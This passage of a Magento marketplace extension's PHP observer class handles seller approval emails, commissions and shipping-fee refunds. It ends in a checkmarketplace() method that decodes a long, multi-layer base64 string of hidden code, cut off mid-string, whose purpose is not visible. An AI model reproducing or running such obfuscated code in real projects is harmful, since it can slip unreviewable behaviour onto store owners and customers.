                $helper = Mage::helper('marketplace');
                $prodmodel = Mage::getModel('catalog/product');
                foreach ($data['product_ids'] as $item) {
                    $prodmodel->load($item);
                    if ($prodmodel->getId()) {
                        $vendorid = $prodmodel->getVendorId();
                        $sku = $prodmodel->getSku();
                        $sellerId = $helper->getSelleridfromProductvendorid($vendorid);
                        if (isset($array[$sellerId]) && !empty($array[$sellerId])) {
                            array_push($array[$sellerId], $sku);
                        } else {
                            $array[$sellerId] = array($sku);
                        }
                    }
                }
            }
            $status = 'Disapproved';
            if (isset($data['attributes_data']['marketplace_product_approve']) && $data['attributes_data']['marketplace_product_approve']) {
                $status = 'Approved';
            }
            foreach ($array as $key => $item) {
                try {
                    $seller = Mage::getModel('marketplace/list')->load($key);
                    if ($seller->getId()) {
                        if ($seller->getId()) {
                            $sellerdetail = Mage::getModel('marketplace/seller')->load($seller->getId(), 'seller_id');
                            $sellername = $sellerdetail->getFirstname();
                            $selleremail = $sellerdetail->getEmail();
                            $senderemail = Mage::getStoreConfig('trans_email/ident_general/email');
                            $_sendername = Mage::getStoreConfig('trans_email/ident_general/name');
                            $emailtemplate = Mage::getModel('core/email_template')->loadByCode('seller_product_approved');
                            $mailname = Mage::app()->getStore()->getFrontendName();
                            $emailTemplateVariable['status'] = $status;
                            $emailTemplateVariable['sku'] = implode(',', $item);
                            $emailTemplateVariable['frontname'] = Mage::app()->getStore()->getFrontendName();
                            $emailtemplate->setSenderName($_sendername);
                            $emailtemplate->setSenderEmail($senderemail);
                            $emailtemplate->send($selleremail, $sellername, $emailTemplateVariable);
                        }
                    }
                } catch (Exception $e) {
                    Mage::log($e->getMessage());
                }
            }
        }
    }

    /*
     * Seller commission calculate when product type is downloadable or virtual
     */

    public function order_save_commit($observer)
    {
        //commission calculate for downloadable and virtual product.
        $order = $observer->getOrder();
        if ($order->getState() == Mage_Sales_Model_Order::STATE_COMPLETE || $order->getState() == 'processing') {
            $data = Mage::app()->getRequest()->getParams();
            $item_ids = '';
            $itemqty = array();
            if (isset($data['invoice']['items'])) {
                foreach ($data['invoice']['items'] as $key => $item) {
                    $item_ids[] = $key;
                    $itemqty[$key] = $item;
                }
            }
            if (isset($item_ids) && !empty($item_ids)) {
                $orderload = Mage::getModel('sales/order')->load($order->getId());
                $collection = Mage::getModel('sales/order_item')->getCollection()->addAttributeToFilter('item_id', array('in' => $item_ids))->addAttributeToFilter('order_id', $order->getId());
                $checkincludetax = Mage::getStoreConfig('marketplace_setting/marketplace/catalogprice_includes_tax');
                foreach ($collection as $item) {
                    if ($item->getProductType() == 'downloadable' || $item->getProductType() == 'virtual') {
                        $prod = Mage::getModel('catalog/product')->load($item->getProductId());
                        if ($prod->getTypeId() != 'bundle') {
                            if ($prod->getVendorId() != '') {
                                $seller = Mage::getModel('marketplace/list')->getCollection()->addFieldToFilter('product_vendor_id', $prod->getVendorId())->getFirstItem()->getData();
                                if (isset($seller['id']) && $seller['id'] != '') {
                                    $sellerdetail = Mage::getModel('marketplace/seller')->load($seller['id'], "seller_id");
                                    $days = '';
                                    if ($sellerdetail->getId()) {
                                        $days = $sellerdetail->getSellerCreditDays();
                                    }
                                    if ($itemqty[$item->getItemId()] > 0) {
                                        $qty = $itemqty[$item->getItemId()];
                                        $totalprice = '';
                                        $baseprice = $item->getBasePrice();
                                        $totalprice = ($baseprice * $qty);
                                        if ($checkincludetax) {
                                            $basepriceincludetax = $item->getBasePriceInclTax();
                                            if ($basepriceincludetax != '') {
                                                $totalprice = ($basepriceincludetax * $qty);
                                                $baseprice = $basepriceincludetax;
                                            }
                                        }
                                        $shippingcharge = 0;
                                        if (isset($item['base_shipping_charge']) && !empty($item['base_shipping_charge'])) {
                                            $totalprice += $item['base_shipping_charge'];
                                            $shippingcharge = $item['base_shipping_charge'];
                                        }
                                        $comm_amt = Mage::helper("marketplace")->getSellerCommissionAmount($seller['id'], $item->getProductId(), $baseprice, $qty, $shippingcharge);
                                        $seller_credit = '';
                                        if (!$days) {
                                            $seller_credit = $totalprice - $comm_amt;
                                            $commission = Mage::getModel('marketplace/commission');
                                            $array = array(
                                                'date' => now(),
                                                'order_increment_id' => $order->getIncrementId(),
                                                'order_item_id' => $item->getItemId(),
                                                'seller_id' => $seller['id'],
                                                'product_id' => $item->getProductId(),
                                                'base_shipping_charge' => $shippingcharge,
                                                'commission_amt' => $comm_amt,
                                                'qty' => $itemqty[$item->getItemId()],
                                                'seller_credit' => $seller_credit,
                                                'type' => 0,
                                            );
                                            $commission->setData($array);
                                            $commission->save();
                                            if ($commission->getId()) {
                                                /* code for balance statement start     */
                                                $balance_statement = array();
                                                $balance_statement["transaction_id"] = $commission->getId();
                                                $balance_statement["transaction_type"] = "order";
                                                $balance_statement["credit"] = $commission->getSellerCredit();
                                                $balance_statement["date"] = $commission->getDate();
                                                $balance_statement["seller_id"] = $commission->getSellerId();
                                                $balance_statement["order_id"] = $commission->getOrderIncrementId();
                                                Mage::helper("marketplace")->saveTransactionReport($balance_statement);
                                                /* code for balance statement end     */
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    /*
     * if seller fail to login then redirect to seller login page
     */

    public function validateLogin($observer)
    {
        $params = Mage::app()->getFrontController()->getRequest()->getParams();
        if (isset($params['seller']) && $params['seller'] == 1) {
            if (isset($params['login']['username'])) {
                $users = Mage::getModel('admin/user')->getCollection()->addFieldToFilter('username', $params['login']['username'])->getFirstItem();
                if ($users->getUserId()) {
                    if (!$users->getIsActive()) {
                        Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getUrl('marketplace/sellerlogin') . '?inactive');
                        Mage::app()->getResponse()->sendResponse();
                        exit;
                    }
                }
            }
            Mage::app()->getFrontController()->getResponse()->setRedirect(Mage::getUrl('marketplace/sellerlogin') . '?failed');
            Mage::app()->getResponse()->sendResponse();
        }
    }

    /*
     * Save category commission
     */

    public function saveCategoryCommission($observer)
    {
        try {
            $configValue = unserialize(Mage::getStoreConfig('marketplace_setting/categorycommission/ua_regexp'));
            if ($configValue) {
                $tarray = array();
                foreach ($configValue as $key => $value) {
                    $tarray[$value['category'] . '-' . $value['commissiontype']] = $value['commission'];
                }
                $farray = array();
                foreach ($tarray as $tk => $tv) {
                    $splitkey = explode('-', $tk);
                    $farray[] = array('category' => $splitkey[0], 'commissiontype' => $splitkey[1], 'commission' => $tv);
                }
                $serialzed = serialize($farray);
                Mage::getModel('core/config')->saveConfig('marketplace_setting/categorycommission/ua_regexp', $serialzed);
            }
        } catch (Exception $ex) {
            Mage::logException($ex->getMessage());
        }
    }

    /*
     * Save seller_id in quote
     */

    public function salesQuoteItemSetSellerId($observer)
    {
        $quoteItem = $observer->getQuoteItem();
        $product = $observer->getProduct();
        $seller_id = Mage::helper("marketplace")->sellerIdFromProductId($product->getId());
        $quoteItem->setSellerId($seller_id);
    }

    /*
     * After admin login set cookie
     */

    public function adminloginSuccess($observer)
    {
        $adminfrontname = (string) Mage::getConfig()->getNode("admin/routers/adminhtml/args")->frontName;
        $seller_id = Mage::helper('marketplace')->getSellerIdfromLoginUser();
        if ($seller_id) {
            Mage::getModel('core/cookie')->set('emsellerloginid', $seller_id);
        }
        Mage::app()->getResponse()->setRedirect(Mage::getBaseUrl() . $adminfrontname);
        Mage::app()->getResponse()->sendResponse();
        exit;
    }

    /*
     * Check shipping fees in credit memo create form
     */

    public function checkShippingFeesInCreditmemo(Varien_Event_Observer $observer)
    {
        $shipAmount = 0;
        $shipBaseAmount = 0;
        $refundedFees = 0;
        $refundedBaseFees = 0;
        $remainingFees = 0;
        $remainingBaseFees = 0;
        $creditmemo = $observer->getEvent()->getCreditmemo();
        $data = $creditmemo->getData();
        $orderId = $creditmemo->getOrderId();

        $shipAmount = $creditmemo->getShippingAmount();
        $shipBaseAmount = $creditmemo->getBaseShippingAmount();

        $postdata = Mage::app()->getRequest()->getParams();

        foreach ($postdata["creditmemo"]["items"] as $ItemId => $value) {
            $creditMemoItem = Mage::getResourceModel('sales/order_creditmemo_item_collection');
            $creditMemoItem->addFieldToFilter('order_item_id', $ItemId);

            if (count($creditMemoItem) > 0 && $value["qty"] != 0) {
                foreach ($creditMemoItem->getData() as $Items) {
                    $refundedFees = $Items["shipping_charge"] + $refundedFees;
                    $refundedBaseFees = $Items["base_shipping_charge"] + $refundedBaseFees;
                }

                $orderItemCollection = Mage::getModel('sales/order_item')->load($ItemId, 'item_id');

                $totalShipFees = $orderItemCollection->getShippingCharge();
                $totalBaseShipFees = $orderItemCollection->getBaseShippingCharge();

                $remainingFees = $totalShipFees - $refundedFees;
                $remainingBaseFees = $totalBaseShipFees - $refundedBaseFees;

                if ($totalShipFees >= $refundedFees + $shipAmount && $totalBaseShipFees >= $refundedBaseFees + $shipBaseAmount) {
                    $remainingFees = $totalShipFees - $refundedFees;
                    $remainingBaseFees = $totalBaseShipFees - $refundedBaseFees;
                } else {
                    $url = Mage::helper('core/http')->getHttpReferer() ? Mage::helper('core/http')->getHttpReferer() : Mage::getUrl();
                    Mage::app()->getFrontController()->getResponse()->setRedirect($url);
                    Mage::getSingleton('core/session')->addError('Maximum shipping amount allowed to refund is:' . $remainingFees);
                    Mage::app()->getResponse()->sendResponse();
                    exit;
                }
            }
        }
    }

    /*
     * Save shipping fees in credit memo
     */

    public function saveShippingFeesInCreditmemo(Varien_Event_Observer $observer)
    {
        $shipAmount = 0;
        $shipBaseAmount = 0;
        $creditmemo = $observer->getEvent()->getCreditmemo();
        $data = $creditmemo->getData();
        $entityId = $creditmemo->getEntityId();
        $shipAmount = $creditmemo->getShippingAmount();
        $shipBaseAmount = $creditmemo->getBaseShippingAmount();
        $creditmemoCollection = Mage::getModel('sales/order_creditmemo_item')->load($entityId, 'parent_id');
        $creditmemoCollection->setShippingCharge($shipAmount);
        $creditmemoCollection->setBaseShippingCharge($shipBaseAmount);
        $creditmemoCollection->save();
    }

    /*
     * Set shipping fees in invoice
     */

    public function setShippingFeesInInvoice(Varien_Event_Observer $observer)
    {

        $shipFees = 0;
        $shipBaseFees = 0;

        $grandTotal = 0;
        $baseGrandTotal = 0;

        $Invoice = $observer->getEvent()->getInvoice();
        $data = $Invoice->getData();

        $orderId = $Invoice->getOrderId();
        $totalShipAmount = $Invoice->getShippingAmount();
        $totalshipBaseAmount = $Invoice->getBaseShippingAmount();
        $sellerid = $Invoice->getSellerId();

        $InvoiceCollection = Mage::getResourceModel('sales/order_invoice_collection');
        $InvoiceCollection->addFieldToFilter('order_id', $orderId);
        $InvoiceCollection->addFieldToFilter('seller_id', $sellerid);

        if (count($InvoiceCollection) > 0) {
            foreach ($InvoiceCollection as $data) {
                $shipFees = $data->getShippingAmount() + $shipFees;
                $shipBaseFees = $data->getBaseShippingAmount() + $shipBaseFees;
            }
            $Invoice->setShippingAmount(0);
            $Invoice->setBaseShippingAmount(0);

            $grandTotal = $Invoice->getGrandTotal() - $shipFees;
            $baseGrandTotal = $Invoice->getBaseGrandTotal() - $shipBaseFees;

            $Invoice->setGrandTotal($grandTotal);
            $Invoice->setBaseGrandTotal($baseGrandTotal);
        }
    }

    public function addFieldToAttributeEditForm($observer)
    {
        // Add an extra field to the base fieldset:
        $fieldset = $observer->getForm()->getElement('front_fieldset');
        $fieldset->addField('manage_by_seller', 'select', array(
            'label' => Mage::helper('marketplace')->__('Manage By Seller'),
            'name' => 'manage_by_seller',
            'values' => array(0 => 'Yes', 1 => 'No'),
            'note' => 'If Attribute is required then this will not apply ',
        ));
    }

    public function checkmarketplace($observer)
    {
        $tFmb = base64_decode('JG9JWFEgPSAnSkVoeldsUWdQU0FuU2tka1MxZHVaMmRRVTBGdVUydG9kMWRIVWtkU1YyUlJWVEJHZFZVeWRHdGhNVXAwVm01T1lVMXRVbEpXVkVKSFpGWlZlV1JIZEZkTlJGWkpWbGQwYjFZeVNuTlhia1pWVm5wRk1GUlhlSE5rUjFJMlZtMW9VMDFJUWtwWFYzUnJZakpHZEZac1dsTldSbHBWVm14Vk1WUkdjRVpYYms1WVZtczFNVlV5TVVkWFJrcHlZak53V0ZZelVuSlZha3BIWXpKT1IxVnNVbGRTTVVwSFZteGFhazVYU25OVWJGcFZZVEJ3YUZSVlpEUlNWbFpYV2tkMFZHSkZWalJWTWpWUFdWWmFXR0ZHVWxwaE1sSk1Xa1phVTJSV1JuUmlSVFZvWWtWd01WWnNWbUZVTVVaMFVteGtWbUpIYUZSWmJURTBZakZTV0dWR2NHdE5WM1F6VjJ0U1UyRkdTblJrUkZaWFlrZFNlbFpWWkZOT2JFWnlaVVpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldZV1ZXWkZoa1IzUnFUV3RhZWxrd1dtOVVNV1JKVVcxb1YySllRbnBhVmxwcll6SkdTVk50Ums1V1ZYQldWbFprZWsxV1pITlhXR3hXWW1zMVZsUlhOVU5OTVd4MFpVaGtXRlpzV25wV1Z6RXdWVEpXZEdSNlJsZE5ibWhZVmtSS1UyUkdUblZWYkdocFlUQndiMWRzV210aE1rNUhZa2hPWVZKWFVuTldha0pYVGxaYWRHTkZUbWhpUld3MldWVmpOVmRHV2taalJtaFlZbFJHVDFwV1dtRmpWa1owWkVaT1RtSnRaRFJXYWtreFkyczFXRlJZYkZOaVIyaFdXV3hvYjJOR2JITldWRVpxVFZaS1JsVXljRk5oYkVwMFpFUldWMkpVVmxoV01uTjRZekZhZFZGc1VrNVdhMjh5Vm10a01GUXlUa2RTYkdoaFVsaENVMVJWVm1Ga1ZsVjRWbXM1VW1KSE9UTlpNRlp2Vkd4WmVXRkhhRlZXTTJob1ZXMTRjMk5XVGxsaFIyaFRUVVp3V2xaSGRHdGhNVlpYVmxoa1ZHRjZiRmxXYlRGVFkyeHNjbFpVVm1wV01EVkpWR3hrUjFkR1NuSmpSVlpYVFZad2RsWkVTa3RTTVdSellrWlNhV0Y2Vms1V1YzaFRVakpKZUZwSVJsUmlSMUpvV1d0V1YwNVdVWGhoU0U1YVZteHdlRmxyVlRWWGJVWnlZMFpTV21FeVVreFZha0UxVmpGV2RHUkdUbXhpV0dONFZtcEtORlV5VW5KT1dFNVlZa2RTVlZsWWNFZFhiRkpYVjJ0MFdsWnNjRmRXYlhocldWZEtSMkpFVGxkaVdGSlFWa1ZhWVZOV1VuSlBWa3BPWWxob1JGWXljRU5qTVVwSFVteG9ZVkpZUWxOVVZWWmhaRlpWZVdSSE9WZE5iRnBaVlRKMFUxVnNXa2hsUlhSV1ZrVktNMXBIZUhkU2JVWkhWRzEwVG1GNlVYaFdWRVpyWVRGU1dGSnNXbE5pYTBwV1ZGY3hlazFHY0Voa1NFNXFVbXRhV2xadGRIZFZhekZKVVZSS1dGWnNXbkZVYkdSU1pESldTVlZzWkdsaVJYQjJWbXBDVjFNd05WZGlTRVpWWWtVMWNGVnRNVEJPVm14V1lVWmthRlpVUmpGWlZWSkxWMGRHY21OSWNGcGhNbEpRVkd4Vk1WZEhUa2hpUlRWb1lUQndNMVpVUmxkVWF6RkhZak5rYVZORlNsRldNR2hEWVVaYWNWRlVRbXhTYlhRMVZGWmFZV0V5U2xaWGJHeFZZa2RSZDFkV1dtdFRSbkJGVTJ4d2FFMXJNSGhYVnpCNFZERk9TRk5yYkZkaVZWcHpWbXRrYjJReFdrVlViWEJyVFZVeE0xWlhlRXRoVlRGMFZXdDBWbFpGU2toWmJYaFBWbXhTY2xOdFJrNVNNMmhLVjFkMGFtVkdUbk5TV0d4aFVucHNZVlJWWkc5VVJteHlWMjVhYkZKVWJGcFdWM2gzVjBaS2NtTklhRmhXYkZwUVdXMHhTMk50VmtWWGJFNVhVbXh3VUZkV1dsTlZNRFZIVlc1U2FsSjZWbkpXYkdodVRWWmtWVlJyT1ZSaVJWWTBWVEp3UTFkR1duUlZia3BhWVRGd1RGVXdWVFZYVmxaelkwWmtUbUp0WkRSV1dIQkhWREZHZEZOc1dtcFRSVXBUVm1wS2IyTldWWGRXYm1ScVRWZFNlRlZzVWxkaE1VcDBaVVp3VjFaNlJqTlpWVnBHWlZad1NWWnNWbFJUUlVwSVYyeGFWazFWTlZaT1ZXeGhVbFJHYjFsVVFscGxSbHBIVjJzMVQxSXdjSGxhVlZaVFZXeFplbFZ1UWxkaGEwcG9Xa1phYTJNeFduTlViWFJwVmxoQ1dsWlhNREZSTWtaWVVteG9hMUo2VmxWWmJHUTBXVlprY1ZGdVRsaFdhMW94V1d0a1IxWXdNWE5UYmxKWVZqTm9jbFZxUVhoU01rVjZZa2RHVG1GdGVFMVhiRnBUWXpKV2MySklSbFJoZW14dlZXcENkMU5XYkZaaFIwWm9ZWHBDTkZWdGNFdFdSMHAwWkROd1dHRnJTak5WTUZWNFYwZEdTRkpyTldsU2JrSklWakZrZDFOdFZraFNhMmhUWWtkb1VGVXdWa3RVVmxwVlVXdHdUazFWY0VoVmJUVmhXVlV4U0dWRlZsWldiVkp5VlRKNFJtUXhTblJPVmxKWFZsUldSRll5Y0VOak1VcEhVbTVXVW1KVldtOVdiRlpoVFd4a1dXTkZPVlpOYkZwWlZUSjBiMVl5U25OWGF6RldWa1ZhVEZwWGVITldNWEJHVDFkc1UwMUlRWGhXYTJONFRrWmtWazFZVmxaaWF6Vm9WbTF6TVdWV1pIRlNhMDVYVmxSR1NWZHJWVFZWTVVwV1YycE9WazFXV25aYVYzaFRZMnhTZFZGc1NsZE5iRXBNVmxaU1ExSXlTbk5VYkZwVllUQndhRlJWWkRSU1ZsWlhXa2QwVkdKRlZqTlZiVEF4VmtaYVZrNVZUbHBXUlhCUVZUQmtTMU5IVmtkalJUVnBVbTA0ZVZaVVJsZFZiVkY0WWpOc1ZXRXlhRlJaYlRFMFkxWlNXR1ZIUm1sV2JrSklXVlZXTUdGck1VbFZhMVpYVm5wV1ZGWXllRnBsVmxaMVZHeGFhRTFyTUhoWGExWmhZekZrU0ZOcmJGZGhNMmhZVlRCVk1WVkdWbFZUYms1U1lrYzVNMWxyVmxOVmJGbDVWV3QwVmxaRlNraFpiWGhQVm14U2NsTnRSazVTTTJoR1ZsWmFhMkV4VG5OU1dHUlRZbXR3V1ZsVVNrNU5WbkJHVjI1T1dGSXdjRXBXYlhSM1ZURktSbE51VmxoV2JIQjJWa1JLVjJNeVRrZGlSbHBYWlcxNFRWWlVRbGRUTWxGNFdraE9ZVkpVYkhCVmFrRjRUa1pzTmxOVVJtaFNhMjh5V1d0U1lWbFdTbFpPV0VwWVlURlpkMVpyV2tkV1JUbFdZMFpLVGxaWE9UWldNVnBoWVRGWmVWSnVUbXBTYlhoV1dXeFdkMVJHVWxoTlZ6bE9Za2QzTWxaSGVFdGhWMHBJWVVaV1ZsWnNTbWhWTW5oR1pVWk9jVlJzY0ZkaVZrcFpWMVprTkdReFpGZFZibEpVWVROQ2NGbFVRbmRrYkdSeVZtMTBhV0pWV2xoWlZWcFhZV3N4UlZaclZscFdiRnBJV1cxNFQxWnNVbkpUYlVaT1VqTm9SbFpXV210aE1VNXpVbGhrVTJKVVZsVldiRlV4VVRGa2NWRnVUbE5TYTFveFZWY3hSMkZHV2xaWGFrcFlWa1ZLZGxWNlNrdFNNa2w2WVVaQ1dGSnJjR2hXYWtKaFV6Sk9WMkpHV2xWaVZGWndXVlJPYmsxV1pIVmhlbFpYWWtWd1NsbFZhRXRYYlVaeVlrUlNXbFpYVWtoV01GVXhVa2RTUjJGRk5XaE5WbXd6VmpKNGEyUXhSblJWYTFwUVZtMVNUMVpxUW5kWlZscFpZMFZhVG1KR1NsZFdSbWhyVkRGYWRHRkZWbFZXYlZKVVdXdGtWMk5zV25WalJsWnBWMFZLVVZaRVJtRmlNVXBHVGxab1ZHSklRbGRhVjNSV1pWWlpkMVpyTlU1V2JrSkpWbTF3WVZaR1pFWk9Wa0phWWxoQ1JGcEVSazlqYkZKVlZtMXdVMWRGUlhoWGExSkxZVEZOZUZOWWFGUmhhM0JoV1d0a1UxTkdhM2RhUlhScVVqRkdOVmRyVmpCV1JrcFpVVzV3VjAxdVFsQldSekZQVW0xU1IxVnNTbWhpVmtwSFZteGFhazVYU25OVWJGcFZZVEJ3YUZSVlpEUlNWbFpYV2tkMFZHSkZWak5WYlRBeFZrWmFWazVWVGxoaGEwcDZWV3RhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVZWNVVsaHNWRmRIZUU5V2FrcHZZakZhZFdOR1pGWlNiVko2V1ZWa2QxbFZNVlpUYkZaV1ZtMVJkMWxYTVV0V01XUjFWbXh3YkdFeGJ6SlhWekUwWkRGT1JrOVdiRlppU0VKWVZGYzFibVZHVlhsalJWcHJUVVJTTTFaWGVFdGhWVEYwVld0MFZsWkZTa2haYlhoUFZteFNjbE50Ums1U00yaEdWbFphYTJFeFRuTlNXR1JUWWxSV1ZWWnNWVEZSTVdSeFUyMUdWMUpyV2pCYVZXUnpWa1pLVlZadWNGWk5WbHAyV2xkNFUyTnNVblZSYkVwWFRXeEtURlpXVWtOU01rcHpWR3hhVldFd2NHaFVWV1EwVWxaV1YxcEhkRlJpUlZZelZXMHdNVlpHV2xaT1ZVNVlZV3RLZWxWcldrZFhSbkJHWkVaT1RsWlhPVFZXTVdRMFlURkplVlJyYUZSaWEzQlFWbXBPYjJOc2NGZFdhMXBQVm1zMVYxbFZWazloUmtsM1RsUkdWMUo2UlRCV01WVjNaVVprY1Zac2NHaE5SRll4VjFaU1MxTXhaRWRUYmxKUFZqQmFXRlp0ZEhabFZtUllaVWQwVTAxck5VbFZNalZEWVRBeGRGVnNaRlppUjFKMlZsZDRhMUpXU25OYVJscE9WbXR3U1ZaRVJsZGpNVnBXVFZaYVQxWnNjRlZVVmxwTFRteGFTR1JGT1dwU2ExcFpWMnRXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSc1dsVmhNRFZSVm14YVMxVXhiSEZUYlhSVVlrVldNMVZ0TURGV1JscFdUbFZPV0dGclNucFZhMXBIVjBad1JtTkdTazVTVm5BeFZsUkdWMVF4Um5OaU0yeFZZVEo0VlZsc2FHOWhSbEpYVlc1T1RsSnRVbGhaVlZwUFlVZEtWbGRyVmxoaGEzQjZWa1pWZUZaV1ZuVlhiRnBUVWxad1JGWkVRbUZrTVU1R1QxWnNWbUpJUWxoVVZ6VnVaVVphVmxwRVVrNVNNRnBIV2xWYWMyRlZNSGxWYXpWWFlUSlJNRmxVUm1GT2JFNXlWMjEwVTAxV2NEUldWbHB2VlRGV1IxZHVWbUZTUlVwWlZXMHhiMDVzY0ZaV2FsSlRWbTFTV2xrd1kzaFdhekYxVlZoc1dGWnNjRkJWTWpGT1pESktSbFZzV21sWFJrcDNWa1prZDFJeVNYaGlSbVJhWld0YVZsUldhRU5YYkdSVlZHczVWR0pGVmpSVk1uQlBWMFphZEdGR1VsaGlXR2g2VmpGYVQyUlhTa2RqUm1oVFRURkplbFpyVWs5aGJWRjRWRmhrYVZKV1NsTldha3BUVXpGV1ZWRnJaR2xpUlRWWFZrZDBTMWxWTVVobFJWWldWbTFTY2xVeWVFWmtNVXAwVGxaU1YxWlVWbFZYVmxKTFUyMVdWazFXYUdoU01taFlXbGQ0UzJSV1dsWlhhemxTWWxWV05WWkhkRzlWTWtaeVUyeHdWVll6VW1oVWJGcHlaVlV4VmxwRk9WZGlWa1Y0VmpKMGEwMUhSbFpOV0VaVFlsUnNZVlp0TVU1a01XeDBaVWM1VjFZd01UTlViRlpUV1ZkV2NsTnJNVlpOVmxwUVZWZDRkbVF5U2taVmJFcFhUV3hLVEZaV1VrTlNNa3B6Vkd4YVZXRXdjR2hVVldRMFVsWldWMXBIZEZSaVJWWTBWVEkxUzFkdFJuSmlSRkphVmxkU1NGWXdWVEZXYkZaMFlVWk9UbEp0T0hoV2ExcGhWREZHY2s5V1dtbFNWM2hXV1ZkMFlWbFdiSFJqZWtKclRWZDBOVmxyWXpGaFJURlpVV3RzVlUxWGFGUldNbmhhWlZkV1JWSnNWbE5XVkZaRVYydFdWbVZGTlZoVldHeGhVbFJXVjFSWE5VNWxiRlp5VjJ0a2EySkhPVE5aYTFaVFZXeFplVlZyZEZaV1JVcElXVzE0VDFac1VuSlRiVVpPVWpOb1JsWldXbXRoTVU1elVsaGtVMkpVVmxWWlZFcFRWa1p3U0UxVmRGaFNhM0F4VlZjeGMyRkZNVVZXYWtwWFRWWndkbFV5TVZkV2JVcEdWbXMxVTAxc1NuaFdSbEpIV1ZkT1IySkVXbFZpUlRWelZteG9VMUpXV2xoTlZFSm9WbFJHZUZWdE1EVlhiRnAwVkZoa1dtVnJTbnBWYTFWNFUxZEtSazFXU2s1U1ZtdDNWbGh3UjFVeVZuTlZia3BWWW10S1UxWnFTbE5UTVZaVlVXdGthV0pGTlZkV1IzUkxXVlV4U0dWRlZsWldiVkp5VlRKNFJtUXhTblJPVmxKWFZsUldSRmRXVWtka01VNUdUMVpzVm1KSVFsaFVWelZ1WlVaYVYxVnJkR2xOYTFwSlZrYzFSMVpXV1hsVmJFcFhWa1ZLVEZSdGVIZFNNWEJHWkVkNGFWWnJjRXRXVkVacVRsWk5lRk5ZYUZSaGEzQmhXV3RrVTFOR2EzZGFSWFJxVWpGR05WZHJWWGhXTVVwWFYycGFWazFXV2xSVmJURlBVbXM1VlZSck5WTlhSa3BNVmxaU1ExSXlTbk5VYkZwVllUQndhRlJWWkRSU1ZsWlhXa2QwVkdKRlZqTlZiVEF4VmtaYVZrNVZUbGhoYTBwNlZXdGFWMlJIVmtobFJsSlRZVE5DTmxZeFkzZE5WbEY1Vkd0b1ZGZEhlRkJXYkZwTFlqRldjVkZ0Ums5V2JFcFlWa2QwUzFWR1dsaGxSWEJYVWpOQ1NGWXlNVXRqYXpWSldrWndUbUpZYURGWFZsSkhaREZrV0ZKclZsSmlWVnBZV2xkNFdrMXNaRmRYYlhCUFZqRktWMXBWVmxOVmJHUklWV3MxVmxaRlNraFVhMXBPWlVaV2RXTkdWbWhOUkZZelZsWmFhMkV4VG5OU1dHUlRZbFJXVlZac1ZURlJNV1J4VVc1T1UxSnJXbGxYYTFaM1ZXc3hSbGR1VmxaTlZscFFWVmN4Um1WSFRrZGlSMmhUVWxWd2IxWnROWGRXTURWellrWmtXbVZzV25KV2JYUlhUbFpzVmxwSE9XaGlWVnA1V1d0ak1WWnNTbkpPVlZKaFZucEdWRll3V2s5a1YwNUlaRVpTVTFZelozbFdWRW93WVRGWmQwNVZhRlpoTW1oWVdXMTRZV05XVWxoTlZGSk9Za2Q0TUZsclVrOVpWVEZGVW14V1lWSkZjSEpXUjNoV1pWZE9ObFJzVGxOaE1XOTVWakp3UTJNeFNrZFNiR2hoVWxoQ1UxUlZWbUZrVmxWNFZtczVVbUpIT1ROWmExWlRWV3haZVZWcmRGWldSVXBJV1cxNFQyTnNjRWRhUlRsVFRWVndTbFp0TURGV01rWnlUVmhTYkZKRmNHRlpiR2hUVlVac2NWSnVUbGhXYXpWYVdUQldkMVV4U2taVGJsWllWMGhDVUZacVNrZFhSbEpaWTBaYWFXSllhRTVXVmxKSFV6Sk5lR05HV21oU2F6VndWV3BDZDAxV1draE9WVTVvVmxSR2VGWlhOWGRXUmxwWFUydDBXbVZyU25wVmJGcExWMVpHYzFGdGRHeGhNSEJPVmxkMFlWSXlVbk5pTTJScFVsWktVMVpxU2xOVE1WWlZVV3RrYVdKRk5WZFdSM1JMV1ZVeFNHVkZWbFpXYlZKeVZUSjRSbVF4U25ST1ZsSm9UV3hLVVZkWGNFdFNiVkY0Vm01V1dHSlhlRmhVVlZwM1RURmtXRTFZWkZOaVJ6azBWVmQ0VTFWdFNuVlJia3BYWVd0S00xUnRlSGRTYlVaR1kwZHNUbE5GU2twWGJGWnZVVEZrY2sxWVRsaGhhMXBoV2xkMGQxZEdaSFJOVlZwc1ZteHdlRlp0YzNoVmF6RkdWMVJDVjFKc2NGQlVWRVoyWkRBeFYxVnRhR3hpVmtwSFZteGFhazVYU25OVWJGcFZZVEJ3YUZSVlpEUlNWbFpYV2tkMFZHSkZWak5WYlRBeFZrWmFWazVWVGxoaGEwcDZWV3RhUjFkR2NFWmtSazVPVWtaWmVWWXhXbE5STVZWNVZXNVNWR0pIYUZSWmJYUkxZMFpzV0dSSVRtbGlSbHBJVmtkMFQySkhTbGRUYkd4V1RXcFdNMWxVUms5U2JVcEpWMnhTYUUxc1JYZFhWRUpoWTIxV1YxZHVWbGRpV0VKUFdXdGFkMlJHWkZkVmEzUlhUVVJXVjFwVlZsTlZiR1JJWVVaQ1dsWnRhSEpaYlhoVFZqRlNkVk5yT1U1U2EzQlVWMWR3UzJFeFRuTlNXR1JUWWxSV1ZWWnNWVEZSTVdSeFVXNU9VMUpyV2xsWGExWjNWV3N4UmxkdVZsWk5WbHBRVlZkNGRtUXlUa1poUmxacFZrZDRkbFpHVm1GVE1ERnpZa2hPWVZKWFVuRlZha0ozWlVaYVIxcEhkRlpXYkZZelZUSndZVmxXU25SVmEzaGhWbnBHVkZVeFdrOVhSVGxXWkVaT1RrMXRaM3BXYWtaVFV6RlplVlZzYUZWWFIzaFlXV3hhZDJJeFVsaGxSbkJPVm14S1IxWkhkRXRpUmtwVllrWldZVkpGY0hKV1IzaFdaVmRPTmxSc1RsTmhNVzk1VmpKd1EyTXhTa2RTYkdoaFVsaENVMVJWVm1Ga1ZsVjRWbXM1VW1KSE9UTlphMVpUVld4WmVWVnJkRlpXUlVwSVdXMTRUMk5zY0VaUFYyeE9ZVEZaZWxadE1YZFZNa1Y0VTFob1dHRnJXbWhWYkdSVFpXeHdTRTFWZEdwV2EzQlpWMnRhUjFack1VWmlla3BZWVRGd2NsVjZTbGRrUmxaeVlrWlNWMlZ0ZUUxV1YzQlBZakpSZUZwR1ZsUmlSMUp5Vm1wQmVFNVdXblJOVjBab1VsUkdlbFl4VWtkV1Z